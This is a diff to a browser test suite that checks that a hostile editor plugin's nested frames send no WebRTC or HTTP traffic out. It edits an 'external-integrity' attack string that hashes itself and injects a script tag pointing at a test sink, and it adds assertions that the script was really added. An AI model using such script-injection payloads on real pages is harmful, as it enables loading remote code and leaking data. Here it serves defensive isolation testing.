@@ -154,7 +154,7 @@ const NESTED_ATTEMPTS: Record<string, string> = {
   'module-shadow': MODULE_ALONE_IN_CHILD,
   // An external script admitted by its own hash's integrity (fetched before the check): never leaves, guarded or not
   // (the first-party bundle's policy names no URL).
-  'external-integrity': "crypto.subtle.digest('SHA-256',new TextEncoder().encode(SELF)).then(function(d){var s=document.createElement('script');s.integrity='sha256-'+btoa(String.fromCharCode.apply(null,new Uint8Array(d)));s.src=SINK;document.body.appendChild(s)})",
+  'external-integrity': "crypto.subtle.digest('SHA-256',new TextEncoder().encode(SELF)).then(function(d){var s=document.createElement('script');s.integrity='sha256-'+btoa(String.fromCharCode.apply(null,new Uint8Array(d)));s.src=SINK;document.body.appendChild(s);report('nested-external-added')})",
 };
 
 interface Sink { port: number; packets: () => number; close: () => void }
@@ -416,6 +416,7 @@ describe('editor frames: zero WebRTC egress from a hostile plugin (Chromium, cre
           try {
             await page.goto(`${origin}/host?id=${id}&doc=${encodeURIComponent(doc)}`);
             await page.waitForFunction("window.R.includes('agent-ran')", undefined, { timeout: 10_000 }).catch(() => undefined);
+            if (attempt === 'external-integrity') await page.waitForFunction("window.R.includes('nested-external-added')", undefined, { timeout: 10_000 }).catch(() => undefined);
             await page.waitForTimeout(1200);
             const said = (await page.evaluate('window.R')) as string[];
             const bundleFrame = page.frames().find((f) => f.url().includes(`/api/v1/editors/${id}/`));
@@ -430,6 +431,7 @@ describe('editor frames: zero WebRTC egress from a hostile plugin (Chromium, cre
             }
             // No HTTP request leaves a nested document, guarded or not: the first-party bundle's policy names no URL.
             expect(sinkHits.get(`nested-${editor}`) ?? 0, `${editor} ${attempt}: HTTP requests that left`).toBe(0);
+            if (attempt === 'external-integrity') expect(said, `${editor}: the external script was really added`).toContain('nested-external-added');
             outcomes.push(`${attempt}=${sink.packets()}`);
           } finally {
             await page.close();
